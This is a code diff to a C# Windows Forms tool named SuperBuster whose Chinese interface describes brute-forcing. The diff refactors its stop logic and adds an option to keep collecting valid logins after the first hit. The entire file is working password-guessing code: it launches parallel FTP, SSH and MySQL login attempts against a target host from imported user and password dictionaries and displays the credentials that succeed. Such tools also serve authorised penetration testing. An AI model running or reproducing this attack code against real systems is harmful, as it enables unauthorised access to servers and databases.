@@ -12,6 +12,7 @@ using System.IO;
 using System.Threading;
 using Renci.SshNet;
 using MySql.Data.MySqlClient;
+using System.Diagnostics;
 
 namespace SuperBuster
 {
@@ -25,9 +26,8 @@ namespace SuperBuster
         string[] users;
         string[] passwords;
         string host;
-        bool ftp;
-        bool ssh;
-        bool mysql;
+        int currentrequestId = 0;
+        Dictionary<int, bool> RequestIds = new Dictionary<int, bool>();
         private void button1_Click(object sender, EventArgs e)
         {
 
@@ -87,33 +87,32 @@ namespace SuperBuster
 
         private void button3_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text=="")
+            if (textBox1.Text == "")
             {
                 MessageBox.Show("请输入目标主机！", "提示");
             }
-            else if(richTextBox1.Text=="")
+            else if (richTextBox1.Text == "")
             {
                 MessageBox.Show("请导入用户名字典！", "提示");
             }
-            else if(richTextBox2.Text=="")
+            else if (richTextBox2.Text == "")
             {
                 MessageBox.Show("请导入密码字典！", "提示");
             }
-            else if(button3.Text=="停止爆破")
+            else if (button3.Text == "停止爆破")
             {
                 button3.Text = "开始爆破";
                 label2.Text = "";
-                ftp = false;
-                ssh = false;
-                mysql = false;
+                RequestIds[currentrequestId] = false;
                 textBox1.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
                 radioButton1.Enabled = true;
                 radioButton2.Enabled = true;
                 radioButton3.Enabled = true;
-                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
-                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
+                checkBox1.Enabled = true;
+                richTextBox3.Text += "爆破结束！";                
+                MessageBox.Show("爆破结束！", "提示");
             }
             else
             {
@@ -126,6 +125,7 @@ namespace SuperBuster
                     radioButton1.Enabled = false;
                     radioButton2.Enabled = false;
                     radioButton3.Enabled = false;
+                    checkBox1.Enabled = false;
                     richTextBox3.Clear();
                     label2.Text = "正在进行FTP爆破......";
                     MessageBox.Show("开始FTP爆破！", "提示");
@@ -141,6 +141,7 @@ namespace SuperBuster
                     radioButton1.Enabled = false;
                     radioButton2.Enabled = false;
                     radioButton3.Enabled = false;
+                    checkBox1.Enabled = false;
                     richTextBox3.Clear();
                     label2.Text = "正在进行SSH爆破......";
                     MessageBox.Show("开始SSH爆破！", "提示");
@@ -156,6 +157,7 @@ namespace SuperBuster
                     radioButton1.Enabled = false;
                     radioButton2.Enabled = false;
                     radioButton3.Enabled = false;
+                    checkBox1.Enabled = false;
                     richTextBox3.Clear();
                     label2.Text = "正在进行MySQL爆破......";
                     MessageBox.Show("开始MySQL爆破！", "提示");
@@ -167,71 +169,89 @@ namespace SuperBuster
                 {
                     MessageBox.Show("请选择协议！", "提示");
                 }
-            }            
+            }
         }
         private void FTPBomb()
         {
-            ftp = true;
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
             List<Task> TaskList = new List<Task>();
             for (int i = 0; i < users.Length; i++)
             {
                 int l = i;
-                for(int y = 0; y < passwords.Length; y++)
+                for (int y = 0; y < passwords.Length; y++)
                 {
                     int Y = y;
                     TaskList.Add(Task.Factory.StartNew(() =>
                     {
-                        bool result = FTPRequest(host,users[l],passwords[Y]);
-                        if (result)
+                        if (RequestIds[a])
                         {
-                            BeginInvoke(new Action(() =>
+                            bool result = FTPRequest(host, users[l], passwords[Y]);
+                            if (result)
                             {
-                                if(ftp)
+                                BeginInvoke(new Action(() =>
                                 {
-                                    ftp = false;
-                                    richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
-                                    button3.Text = "开始爆破";
-                                    label2.Text = "";
-                                    richTextBox3.Text += "爆破结束！";
-                                    textBox1.Enabled = true;
-                                    button1.Enabled = true;
-                                    button2.Enabled = true;
-                                    radioButton1.Enabled = true;
-                                    radioButton2.Enabled = true;
-                                    radioButton3.Enabled = true;
-                                    MessageBox.Show("爆破结束！用户名："+users[l]+"密码："+passwords[Y], "提示");
-                                }
-                            }));
+                                    if (RequestIds[a])
+                                    {
+                                        if(checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label2.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            radioButton1.Enabled = true;
+                                            radioButton2.Enabled = true;
+                                            radioButton3.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }                                       
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
                         }
                         else
                         {
-                            BeginInvoke(new Action(() =>
-                            {
-                                if(ftp)
-                                {
-                                    richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
-                                }
-                            }));
+                            return;
                         }
                     }));
-                }              
+                }
             }
             Task.WaitAll(TaskList.ToArray());
-            if (ftp)
+            if (RequestIds[a])
             {
                 button3.Text = "开始爆破";
                 label2.Text = "";
-                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
+                richTextBox3.Text += "爆破结束！";
                 textBox1.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
                 radioButton1.Enabled = true;
                 radioButton2.Enabled = true;
                 radioButton3.Enabled = true;
-                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
             }
         }
-        private bool FTPRequest(string host,string user,string password)
+        private bool FTPRequest(string host, string user, string password)
         {
             FtpWebRequest FTP = (FtpWebRequest)WebRequest.Create(new Uri("ftp://" + host));
             FTP.Method = WebRequestMethods.Ftp.ListDirectory;
@@ -249,7 +269,9 @@ namespace SuperBuster
         }
         private void SSHBomb()
         {
-            ssh = true;
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
             List<Task> TaskList = new List<Task>();
             for (int i = 0; i < users.Length; i++)
             {
@@ -259,61 +281,77 @@ namespace SuperBuster
                     int Y = y;
                     TaskList.Add(Task.Factory.StartNew(() =>
                     {
-                        bool result = SSHRequest(host, users[l], passwords[Y]);
-                        if (result)
+                        if(RequestIds[a])
                         {
-                            BeginInvoke(new Action(() =>
+                            bool result = SSHRequest(host, users[l], passwords[Y]);
+                            if (result)
                             {
-                                if(ssh)
+                                BeginInvoke(new Action(() =>
                                 {
-                                    ssh = false;
-                                    richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
-                                    button3.Text = "开始爆破";
-                                    label2.Text = "";
-                                    richTextBox3.Text += "爆破结束！";
-                                    textBox1.Enabled = true;
-                                    button1.Enabled = true;
-                                    button2.Enabled = true;
-                                    radioButton1.Enabled = true;
-                                    radioButton2.Enabled = true;
-                                    radioButton3.Enabled = true;
-                                    MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
-                                }
-                            }));
+                                    if (RequestIds[a])
+                                    {
+                                        if (checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label2.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            radioButton1.Enabled = true;
+                                            radioButton2.Enabled = true;
+                                            radioButton3.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
                         }
                         else
                         {
-                            BeginInvoke(new Action(() =>
-                            {
-                                if (ssh)
-                                {
-                                    richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
-                                }
-                            }));
+                            return;
                         }
                     }));
                 }
             }
             Task.WaitAll(TaskList.ToArray());
-            if (ssh)
+            if (RequestIds[a])
             {
                 button3.Text = "开始爆破";
                 label2.Text = "";
-                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
+                richTextBox3.Text += "爆破结束！";
                 textBox1.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
                 radioButton1.Enabled = true;
                 radioButton2.Enabled = true;
                 radioButton3.Enabled = true;
-                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
             }
         }
         private bool SSHRequest(string host, string user, string password)
         {
             var SSH = new SshClient(host, user, password);
             try
-            {                
+            {
                 SSH.Connect();
                 return true;
             }
@@ -328,7 +366,9 @@ namespace SuperBuster
         }
         private void MySQLBomb()
         {
-            mysql = true;
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
             List<Task> TaskList = new List<Task>();
             for (int i = 0; i < users.Length; i++)
             {
@@ -338,60 +378,76 @@ namespace SuperBuster
                     int Y = y;
                     TaskList.Add(Task.Factory.StartNew(() =>
                     {
-                        bool result = MySQLRequest(host, users[l], passwords[Y]);
-                        if (result)
+                        if(RequestIds[a])
                         {
-                            BeginInvoke(new Action(() =>
+                            bool result = MySQLRequest(host, users[l], passwords[Y]);
+                            if (result)
                             {
-                                if(mysql)
+                                BeginInvoke(new Action(() =>
                                 {
-                                    mysql = false;
-                                    richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
-                                    button3.Text = "开始爆破";
-                                    label2.Text = "";
-                                    richTextBox3.Text += "爆破结束！";
-                                    textBox1.Enabled = true;
-                                    button1.Enabled = true;
-                                    button2.Enabled = true;
-                                    radioButton1.Enabled = true;
-                                    radioButton2.Enabled = true;
-                                    radioButton3.Enabled = true;
-                                    MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
-                                }
-                            }));
+                                    if (RequestIds[a])
+                                    {
+                                        if (checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label2.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            radioButton1.Enabled = true;
+                                            radioButton2.Enabled = true;
+                                            radioButton3.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
                         }
                         else
                         {
-                            BeginInvoke(new Action(() =>
-                            {
-                                if (mysql)
-                                {
-                                    richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
-                                }
-                            }));
+                            return;
                         }
                     }));
                 }
             }
             Task.WaitAll(TaskList.ToArray());
             Thread.Sleep(1000);
-            if (mysql)
+            if (RequestIds[a])
             {
                 button3.Text = "开始爆破";
                 label2.Text = "";
-                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
+                richTextBox3.Text += "爆破结束！";
                 textBox1.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
                 radioButton1.Enabled = true;
                 radioButton2.Enabled = true;
                 radioButton3.Enabled = true;
-                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
             }
         }
         private bool MySQLRequest(string host, string user, string password)
         {
-            string a = "server=" + host + ";port=3306;uid=" + user + ";pwd=" + password+ ";"+ "SslMode = none;";
+            string a = "server=" + host + ";port=3306;uid=" + user + ";pwd=" + password + ";" + "SslMode = none;";
             MySqlConnection conn = new MySqlConnection(a);
             try
             {
@@ -414,7 +470,7 @@ namespace SuperBuster
 
         private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            System.Diagnostics.Process.Start("https://github.com/7hr0wer/SuperBuster");
+            Process.Start("https://github.com/7hr0wer/SuperBuster");
         }
 
         private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
